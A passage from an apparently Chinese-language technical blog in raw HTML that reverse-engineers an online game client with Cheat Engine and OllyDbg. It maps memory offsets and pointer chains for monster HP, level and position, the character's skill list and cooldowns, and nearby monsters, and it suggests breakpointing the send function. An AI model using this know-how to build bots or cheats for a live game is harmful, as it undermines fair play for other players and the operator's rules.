class=\"line\">2D9E79C8  3E71C8DE</span><br><span class=\"line\">2D9E79CC  BDC16CBC</span><br><span class=\"line\">2D9E79D0  3F77956C</span><br><span class=\"line\">2D9E79D4  3E71C8E3  ASCII &quot;s</span><br><span class=\"line\">2D9E79D8  676F4800  igc32.676F4800</span><br><span class=\"line\">2D9E79DC  01518340  ElementC.01518340</span><br><span class=\"line\">2D9E79E0  41BCBCE0</span><br><span class=\"line\">2D9E79E4  0A345DD8</span><br><span class=\"line\">2D9E79E8  80001C4A</span><br><span class=\"line\">2D9E79EC  0000AE41</span><br><span class=\"line\">2D9E79F0  0000AE41</span><br><span class=\"line\">2D9E79F4  00000010</span><br><span class=\"line\">2D9E79F8  00000000</span><br><span class=\"line\">2D9E79FC  000003BE</span><br><span class=\"line\">2D9E7A54  000003BE</span><br><span class=\"line\">2D9E7ADC  FFFFFFFF</span><br><span class=\"line\">2D9E7AE0  3F800000</span><br><span class=\"line\">2D9E7AE4  78443800</span><br><span class=\"line\">2D9E7AE8  0000000C</span><br><span class=\"line\">2D9E7B40  00001388</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$+3C     4430814B K.0D    ;x</span><br><span class=\"line\">$+40     427230F2 ò0rB    ;z</span><br><span class=\"line\">$+44     C2D852B3 ³RØÂ    ;y</span><br><span class=\"line\">$+124    00000010 ....     ;怪物等级</span><br><span class=\"line\">$+128    00000000 .... </span><br><span class=\"line\">$+12C    000003BE ¾...     ;当前血量</span><br><span class=\"line\">$+184    000003BE ¾...     ;最大血量</span><br><span class=\"line\">$+270    00001388 ....         </span><br><span class=\"line\">$+284    3E312F14 ./1&gt;      L&quot;囚徒怨魂&quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"更新结束-2\"><a class=\"markdownIt-Anchor\" href=\"#更新结束-2\">#</a> 更新结束</h4>\n<p>5. 人物技能信息分析</p>\n<p>1. 每个技能所包含的数据</p>\n<p>技能名称 ID</p>\n<p>技能冷却时间</p>\n<p>可以猜想：有一个技能类，每个技能都是这个类的对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Skill</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillNamel</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillID</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillInterval;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillLevel;</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_skillInfo;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">class skillInfo</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push [eax+0x08]    </span><br><span class=\"line\">eax = 4C270380    4AAE4A38</span><br><span class=\"line\"></span><br><span class=\"line\">46A30A60 01297268 hr). </span><br><span class=\"line\">46A30A64 49C40C18 ..ÄI </span><br><span class=\"line\">46A30A68 00000071 q... </span><br><span class=\"line\">46A30A6C 00000005 .... </span><br><span class=\"line\">46A30A70 00000000 .... </span><br><span class=\"line\">46A30A74 00000000 .... </span><br><span class=\"line\">46A30A78 000003E8 è... </span><br><span class=\"line\">46A30A7C A2B70000 ..·¢ </span><br><span class=\"line\">46A30A80 00000000 .... </span><br><span class=\"line\">46A30A84 00000000 .... </span><br><span class=\"line\">46A30A88 005F7800 .x_. </span><br><span class=\"line\">46A30A8C 00000000 .... </span><br><span class=\"line\">46A30A90 00020100 .... </span><br><span class=\"line\">46A30A94 00000000 .... </span><br><span class=\"line\">46A30A98 00000001 .... </span><br><span class=\"line\">46A30A9C 0000001E .... </span><br><span class=\"line\">46A30AA0 0000001F .... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4272ED50</span><br><span class=\"line\">4C270380  01297268  ElementC.01297268</span><br><span class=\"line\">4C270384  553935B0</span><br><span class=\"line\">4C270388  0000007D       技能ID</span><br><span class=\"line\">4C27038C  00000005       技能等级   C</span><br><span class=\"line\">4C270390  00000000</span><br><span class=\"line\">4C270394  00000000       冷却倒计时</span><br><span class=\"line\">4C270398  000003E8       冷却时间 1000ms</span><br><span class=\"line\">4C27039C  A2B70000</span><br><span class=\"line\">4C2703A0  00000000</span><br><span class=\"line\">4C2703A4  00000000</span><br><span class=\"line\">4C2703A8  005F7800       入口地址</span><br><span class=\"line\">4C2703AC  00000000</span><br><span class=\"line\">4C2703B0  00020100</span><br><span class=\"line\">4C2703B4  00000000</span><br><span class=\"line\"></span><br><span class=\"line\">4C27D890</span><br><span class=\"line\">4C27D890  01297268  ElementC.01297268</span><br><span class=\"line\">4C27D894  55393CB8</span><br><span class=\"line\">4C27D898  0000007F</span><br><span class=\"line\">4C27D89C  00000004</span><br><span class=\"line\">4C27D8A0  00000000</span><br><span class=\"line\">4C27D8A4  00000000   </span><br><span class=\"line\">4C27D8A8  00000BB8</span><br><span class=\"line\">4C27D8AC  D25FF800</span><br><span class=\"line\">4C27D8B0  00000000</span><br><span class=\"line\">4C27D8B4  00000000</span><br><span class=\"line\">4C27D8B8  00000000</span><br><span class=\"line\">4C27D8BC  00000000</span><br><span class=\"line\">4C27D8C0  00020100</span><br><span class=\"line\">4C27D8C4  00000000</span><br><span class=\"line\">4C27D8C8  00000001</span><br><span class=\"line\">4C27D8CC  00000019</span><br><span class=\"line\">4C27D8D0  0000001F</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>推测 00CE92DE</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">46A30A60 01297268 hr). </span><br><span class=\"line\">46A30A64 49C40C18 ..ÄI </span><br><span class=\"line\">46A30A68 00000071 q... </span><br><span class=\"line\">46A30A6C 00000005 .... </span><br><span class=\"line\">46A30A70 00000000 .... </span><br><span class=\"line\">46A30A74 00000000 .... </span><br><span class=\"line\">46A30A78 000003E8 è... </span><br><span class=\"line\">46A30A7C A2B70000 ..·¢ </span><br><span class=\"line\">46A30A80 00000000 .... </span><br><span class=\"line\">46A30A84 00000000 .... </span><br><span class=\"line\">46A30A88 005F7800 .x_. </span><br><span class=\"line\">46A30A8C 00000000 .... </span><br><span class=\"line\">46A30A90 00020100 .... </span><br><span class=\"line\">46A30A94 00000000 .... </span><br><span class=\"line\">46A30A98 00000001 .... </span><br><span class=\"line\">46A30A9C 0000001E .... </span><br><span class=\"line\">46A30AA0 0000001F .... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">495A6148  01297268  ElementC.01297268</span><br><span class=\"line\">495A614C  605D0978</span><br><span class=\"line\">495A6150  0000007D</span><br><span class=\"line\">495A6154  00000005</span><br><span class=\"line\">495A6158  00000000</span><br><span class=\"line\">495A615C  00000000</span><br><span class=\"line\">495A6160  000003E8</span><br><span class=\"line\">495A6164  00726F00  ElementC.00726F00</span><br><span class=\"line\">495A6168  00000000</span><br><span class=\"line\">495A616C  00000000</span><br><span class=\"line\">495A6170  00000000</span><br><span class=\"line\">495A6174  00000000</span><br><span class=\"line\">495A6178  00020100</span><br><span class=\"line\">495A617C  00000000</span><br><span class=\"line\">495A6180  00030000</span><br><span class=\"line\">495A6184  00090006</span><br><span class=\"line\">495A6188  000F000C</span><br><span class=\"line\">495A618C  00190013</span><br><span class=\"line\">495A6190  0021001E</span><br><span class=\"line\">495A6194  00270024</span><br><span class=\"line\">495A6198  002C0029</span><br><span class=\"line\">495A619C  0032002F</span><br><span class=\"line\">495A61A0  003B0036</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">4272EED8 01297268 hr). </span><br><span class=\"line\">4272EEDC 49C403A8 ¨.ÄI </span><br><span class=\"line\">4272EEE0 0000007F .... </span><br><span class=\"line\">4272EEE4 00000004 .... </span><br><span class=\"line\">4272EEE8 00000000 .... </span><br><span class=\"line\">4272EEEC 00000000 .... </span><br><span class=\"line\">4272EEF0 00000BB8 ¸... </span><br><span class=\"line\">4272EEF4 00726F00 .or. </span><br><span class=\"line\">4272EEF8 00000000 .... </span><br><span class=\"line\">4272EEFC 00000000 .... </span><br><span class=\"line\">4272EF00 00000000 .... </span><br><span class=\"line\">4272EF04 00000000 .... </span><br><span class=\"line\">4272EF08 00020100 .... </span><br><span class=\"line\">4272EF0C 00000000 .... </span><br><span class=\"line\">4272EF10 01297268 hr). </span><br><span class=\"line\">4272EF14 4F3C3E50 P&gt;&lt;O </span><br><span class=\"line\">4272EF18 00000C9E .... </span><br><span class=\"line\">4272EF1C 00000001 .... </span><br><span class=\"line\">4272EF20 00000000 .... </span><br><span class=\"line\">4272EF24 00000000 .... </span><br><span class=\"line\">4272EF28 000003E8 è... </span><br><span class=\"line\">4272EF2C 00000000 .... </span><br><span class=\"line\">4272EF30 00000000 .... </span><br><span class=\"line\">4272EF34 00000000 .... </span><br><span class=\"line\">4272EF38 00000000 .... </span><br><span class=\"line\">4272EF3C 00000000 .... </span><br><span class=\"line\">4272EF40 00020100 .... </span><br><span class=\"line\">4272EF44 00000000 .... </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">495A6148  01297268  ElementC.01297268</span><br><span class=\"line\">495A614C  605D0978  技能信息</span><br><span class=\"line\">495A6150  0000007D</span><br><span class=\"line\">495A6154  00000005</span><br><span class=\"line\">495A6158  00000000</span><br><span class=\"line\">495A615C  00000000</span><br><span class=\"line\">495A6160  000003E8</span><br><span class=\"line\">495A6164  00726F00  ElementC.00726F00</span><br><span class=\"line\"></span><br><span class=\"line\">605D0978  0203A5AC  ElementS.0203A5AC</span><br><span class=\"line\">605D097C  023F72B0  ElementS.023F72B0 技能详细信息</span><br><span class=\"line\">605D0980  00000000</span><br><span class=\"line\">605D0984  00000000</span><br><span class=\"line\">605D0988  00000000</span><br><span class=\"line\">605D098C  00000000</span><br><span class=\"line\">605D0990  00000000</span><br><span class=\"line\">605D0994  00000000</span><br><span class=\"line\">605D0998  00000000</span><br><span class=\"line\">605D099C  00000000</span><br><span class=\"line\">605D09A0  00000000</span><br><span class=\"line\">605D09A4  00000000</span><br><span class=\"line\">605D09A8  00000000</span><br><span class=\"line\">605D09AC  0000007D</span><br><span class=\"line\">605D09B0  00000005</span><br><span class=\"line\"></span><br><span class=\"line\">023F72B0  02110B04  ElementS.02110B04</span><br><span class=\"line\">023F72B4  0000007D</span><br><span class=\"line\">023F72B8  00000007</span><br><span class=\"line\">023F72BC  020DBFE4  ElementS.020DBFE4  技能名称</span><br><span class=\"line\">023F72C0  020DBFEC  ElementS.020DBFEC</span><br><span class=\"line\">023F72C4  020DBFF4  ElementS.020DBFF4</span><br><span class=\"line\">023F72C8  0000000A</span><br><span class=\"line\">023F72CC  00020001</span><br><span class=\"line\">023F72D0  00000000</span><br><span class=\"line\"></span><br><span class=\"line\">020DBFE4  7BAD7FBD</span><br><span class=\"line\">020DBFE8  00000000</span><br><span class=\"line\">020DBFEC  FDBCF0D3</span><br><span class=\"line\">020DBFF0  00000000</span><br><span class=\"line\">020DBFF4  FDBCF0D3</span><br><span class=\"line\"></span><br><span class=\"line\">020DBFE4  羽箭..</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>猜测：技能列表使用一个数组存储的</p>\n<p>通过 OD 中下断点 <code>push dword ptr ds:[eax+0x8]</code>  在 OD 中 eax 的值</p>\n<p>491B2710 A7</p>\n<p>4B637FE8 71</p>\n<p>491B2828 72</p>\n<p>491B29B0 7D</p>\n<p>491A5200 7F</p>\n<h4 id=\"角色人物技能列表\"><a class=\"markdownIt-Anchor\" href=\"#角色人物技能列表\">#</a> 角色人物技能列表</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230103134451637.png\" alt=\"image-20230103134451637\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230103134511620.png\" alt=\"image-20230103134511620\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">432CF230  4B637FE8</span><br><span class=\"line\">432CF234  491B2828</span><br><span class=\"line\">432CF238  491B29B0</span><br><span class=\"line\">432CF23C  491A5200</span><br><span class=\"line\">432CF240  491B2710</span><br><span class=\"line\">432CF244  CDD0A3C4</span><br><span class=\"line\">[432CF230]</span><br><span class=\"line\"></span><br><span class=\"line\">4B637FE8  01297268  ElementC.01297268</span><br><span class=\"line\">4B637FEC  4C573D48</span><br><span class=\"line\">4B637FF0  00000071</span><br><span class=\"line\">4B637FF4  00000005</span><br><span class=\"line\">4B637FF8  00000000</span><br><span class=\"line\">4B637FFC  00000000</span><br><span class=\"line\">4B638000  000003E8</span><br><span class=\"line\">[[432CF230]+4]</span><br><span class=\"line\"></span><br><span class=\"line\">4C573D48  0208A5AC  ElementS.0208A5AC</span><br><span class=\"line\">4C573D4C  0244D660  ElementS.0244D660</span><br><span class=\"line\">4C573D50  00000000</span><br><span class=\"line\">4C573D54  00000000</span><br><span class=\"line\">4C573D58  00000000</span><br><span class=\"line\">4C573D5C  00000000</span><br><span class=\"line\">[[[432CF230]+4]+4]</span><br><span class=\"line\"></span><br><span class=\"line\">0244D660  02160550  ElementS.02160550</span><br><span class=\"line\">0244D664  00000071</span><br><span class=\"line\">0244D668  00000007</span><br><span class=\"line\">0244D66C  021605A8  ElementS.021605A8</span><br><span class=\"line\">0244D670  021605B0  ElementS.021605B0</span><br><span class=\"line\">0244D674  021605B8  ElementS.021605B8</span><br><span class=\"line\">0244D678  0000000A</span><br><span class=\"line\">0244D67C  00000002</span><br><span class=\"line\">[[[[432CF230]+4]+4]+0x0C]</span><br><span class=\"line\"></span><br><span class=\"line\">021605A8  5FC36E05</span><br><span class=\"line\">021605AC  00005492</span><br><span class=\"line\">021605B0  C4D0E5C7</span><br><span class=\"line\">021605B4  0000E4D6</span><br><span class=\"line\">021605B8  C4D0E5C7</span><br><span class=\"line\">021605BC  642EE4D6</span><br><span class=\"line\"></span><br><span class=\"line\">021605A8  清心咒.쓐</span><br><span class=\"line\">[[[[432CF230]+4]+4]+0x0C] = 清心咒</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230103135837650.png\" alt=\"image-20230103135837650\"></p>\n<p>2EEDD430 - [[[14FEE38]+1C]+30] = 2EEDD430 - 2EEDAC10 = 2820</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">2EEDD430  432CF230   人物技能列表</span><br><span class=\"line\">2EEDD434  00000005   人物技能列表长度</span><br><span class=\"line\">2EEDD438  00000010</span><br><span class=\"line\">2EEDD43C  00000010</span><br><span class=\"line\">2EEDD440  01276380  ElementC.01276380</span><br><span class=\"line\">2EEDD444  011ED3B8  ElementC.011ED3B8</span><br><span class=\"line\">2EEDD448  00000000</span><br><span class=\"line\">2EEDD44C  00000000</span><br><span class=\"line\">2EEDD450  00000000</span><br><span class=\"line\">2EEDD454  00000010</span><br><span class=\"line\"></span><br><span class=\"line\">dd [[[14FEE38]+1C]+30] + 2820 = 2EEDD430</span><br></pre></td></tr></table></figure>\n<h4 id=\"人物周围怪物\"><a class=\"markdownIt-Anchor\" href=\"#人物周围怪物\">#</a> 人物周围怪物</h4>\n<p>猜想：怪物</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Monster</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    m_dwMonsterID;</span><br><span class=\"line\">    MonsterInfo monIfo;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MonsterInfo</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\tm_strMonsterName;</span><br><span class=\"line\">    m_dwMonsterID;</span><br><span class=\"line\">    m_Mode;</span><br><span class=\"line\">    m_MonsterGrade;</span><br><span class=\"line\">    m_MonsterShengMing;</span><br><span class=\"line\">    m_MonsterMaxShengMing;</span><br><span class=\"line\">    m_Monster_X_POS;</span><br><span class=\"line\">    m_Monster_Y_POS;</span><br><span class=\"line\">    m_Monster_Z_POS;</span><br><span class=\"line\">    m_MonsterType;    <span class=\"comment\">//npc,monster</span></span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230105211901057.png\" alt=\"image-20230105211901057\"></p>\n<p>00BE9BA4 - 8B 86 18010000  - mov eax,[esi+00000118]  ESI=5F21EBA8</p>\n<p>思路一：</p>\n<p>在游戏中用 CE 搜索怪物的相关信息 (怪物的 ID，生命，名字等信息) 定位到怪物对象的地址，然后通过 OD 下访问断点，找到相关代码，分析代码逻辑，最终找到怪物列表</p>\n<p>思路二：</p>\n<p>网游通过 send 函数断点分析相关操作</p>\n<p>1. 怪物的信息偏移地址分析</p>\n<p>2. 人物周围的怪物列表</p>\n<p>80001C4A</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00BE7E26 - 89 88 2C010000  - mov [eax+0000012C],ecx</span><br><span class=\"line\"></span><br><span class=\"line\">eax = 3EB9CE70</span><br><span class=\"line\"></span><br><span class=\"line\">$+124    00000010 .... </span><br><span class=\"line\">$+128    00000000 .... </span><br><span class=\"line\">$+12C    000003BE ¾... </span><br><span class=\"line\">$+180    00000000 .... </span><br><span class=\"line\">$+184    000003BE ¾... </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00C1BD4B - 8B B8 18010000  - mov edi,[eax+00000118]</span><br><span class=\"line\">00C1BD48              | 8B46 04                | mov eax,dword ptr ds:[esi+4]                   | 3EB978D0</span><br><span class=\"line\">00C1BD4B              | 8BB8 18010000          | mov edi,dword ptr ds:[eax+118]                 | 80001C46</span><br><span class=\"line\">00C1BD51              | 8BB0 B4000000          | mov esi,dword ptr ds:[eax+B4]                  | 00000006</span><br><span class=\"line\">00C1BD57              | E8 F40D0100            | call elementclient.C2CB50                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE9BA4 - 8B 86 18010000  - mov eax,[esi+00000118]</span><br><span class=\"line\"></span><br><span class=\"line\">00C17B6A - 8B BF 18010000  - mov edi,[edi+00000118]   3EB9CE70</span><br><span class=\"line\">00C17B64              | 8BB7 B4000000          | mov esi,dword ptr ds:[edi+B4]                  | 00000006</span><br><span class=\"line\">00C17B6A              | 8BBF 18010000          | mov edi,dword ptr ds:[edi+118]                 | 80001C4A</span><br><span class=\"line\">00C17B70              | E8 DB4F0100            | call elementclient.C2CB50                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE8603 - 8B 86 18010000  - mov eax,[esi+00000118]</span><br><span class=\"line\">00BE8601              | 8B36                   | mov esi,dword ptr ds:[esi]                     |</span><br><span class=\"line\">00BE8603              | 8B86 18010000          | mov eax,dword ptr ds:[esi+118]                 |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE7E26 - 89 88 2C010000  - mov [eax+0000012C],ecx</span><br><span class=\"line\">00BE7E23              | 8B4E 04                | mov ecx,dword ptr ds:[esi+4]                   | 00000291</span><br><span 